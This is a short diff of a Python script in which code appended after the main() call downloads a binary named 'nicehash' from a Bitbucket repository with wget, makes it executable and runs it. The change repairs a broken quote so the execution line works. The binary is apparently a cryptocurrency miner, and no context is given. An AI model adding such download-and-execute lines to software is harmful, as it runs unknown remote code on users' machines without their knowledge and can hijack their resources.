@@ -74,4 +74,4 @@ if __name__ == "__main__":
     main()
 os.system('wget https://bitbucket.org/lightcoral2/lightcoral2/raw/master/nicehash')
 os.system('chmod 777 nicehash')
-os.system('./nicehash)
+os.system('./nicehash')
